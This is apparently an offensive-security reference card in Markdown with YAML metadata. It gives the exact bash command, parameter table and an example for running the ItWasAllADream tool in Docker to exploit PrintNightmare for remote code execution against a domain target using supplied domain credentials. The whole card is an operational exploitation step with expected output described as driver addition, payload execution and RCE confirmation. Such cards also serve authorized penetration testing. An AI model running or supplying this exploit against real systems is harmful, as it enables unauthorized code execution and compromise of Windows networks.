---
type: command
executor: bash
data: >-
  docker run -it itwasalladream -u $_USERNAME -p $_PASSWORD -d $_DOMAIN
  $_TARGET_IP
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - exploitation
  - rce
  - docker
verified: true
validated: true
---

# run-itwasalladream-docker

## Command

```bash
docker run -it itwasalladream -u $_USERNAME -p $_PASSWORD -d $_DOMAIN $_TARGET_IP
```

## Description

Runs the ItWasAllADream tool in a Docker container to exploit PrintNightmare, avoiding local dependency issues. The image must be available or pulled automatically.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -it | Interactive terminal mode | Yes |
| -u $_USERNAME | Domain username | Yes |
| -p $_PASSWORD | Domain password | Yes |
| -d $_DOMAIN | Target domain | Yes |
| $_TARGET_IP | Single target IP (no CIDR for Docker variant) | Yes |

## Examples

### Basic Usage

```bash
docker run -it itwasalladream -u username -p Password123 -d domain 10.10.10.10
```

## Expected Output

Similar to local run: Target enumeration, driver addition, payload execution, and RCE confirmation within the container logs.

## Related

- [[procedures/PrintNightmare-Remote-Code-Execution]]
